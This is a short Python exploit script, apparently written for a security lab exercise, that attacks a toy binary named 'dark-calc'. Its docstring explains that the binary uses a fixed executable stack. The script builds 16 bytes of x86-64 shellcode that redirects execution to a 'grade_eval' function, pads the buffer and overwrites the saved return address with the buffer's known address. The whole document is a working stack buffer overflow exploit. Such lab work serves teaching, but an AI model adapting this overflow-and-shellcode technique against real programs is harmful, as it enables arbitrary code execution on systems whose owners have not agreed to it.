#!/usr/bin/env python3
"""Task 2: executable fixed stack + shellcode in attack/dark-calc.

init_fixed_stack() maps 0x721000000000..0x721000802000 with PROT_EXEC,
puts guard pages at both ends and stores fixed_stack_top =
0x721000801000.  __wrap_main() switches rsp to that value before calling
main(), so input()'s frame is at a fixed address:

    rbp(input) = 0x721000801000 - 0x20
    buffer     = rbp - 0x10 = 0x721000800fd0

The 16-byte shellcode sets edi=4, pushes main as grade_eval's return
address, then pushes/returns to grade_eval.  The two pushes leave rsp
8 mod 16 at grade_eval's entry, as the SysV ABI requires.  After printing
the message, grade_eval returns to main, which reads EOF and exits
cleanly.
"""
import struct
import sys


def p64(x: int) -> bytes:
    return struct.pack("<Q", x)


BUFFER = 0x721000800FD0
GRADE_EVAL = 0x401A87
MAIN = 0x401AC3

# mov edi, 4; push main; push grade_eval; ret
shellcode = (
    b"\xbf\x04\x00\x00\x00"
    + b"\x68" + struct.pack("<I", MAIN)
    + b"\x68" + struct.pack("<I", GRADE_EVAL)
    + b"\xc3"
)
assert len(shellcode) == 16

payload = shellcode
payload += p64(0x4343434343434343)
payload += p64(BUFFER)

assert b"\n" not in payload
sys.stdout.buffer.write(payload)
